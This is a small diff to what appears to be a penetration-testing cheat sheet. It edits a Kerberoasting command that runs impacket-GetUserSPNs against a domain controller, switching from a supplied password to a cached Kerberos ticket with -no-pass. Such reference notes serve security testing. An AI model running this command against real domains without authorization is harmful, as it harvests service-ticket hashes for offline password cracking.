@@ -71,7 +71,7 @@ sudo ntpdate -s <DC> && impacket-GetUserSPNs -request '<DOMAIN>/<USER>:<PASSWORD
 
 ```console
 # With Kerberos
-sudo ntpdate -s <DC> && impacket-GetUserSPNs -request '<DOMAIN>/<USER>:<PASSWORD>' -k -dc-host <DC>
+sudo ntpdate -s <DC> && impacket-GetUserSPNs -request '<DOMAIN>/<USER>' -no-pass -k -dc-host <DC>
 ```
 
 ```console {class="sample-code"}
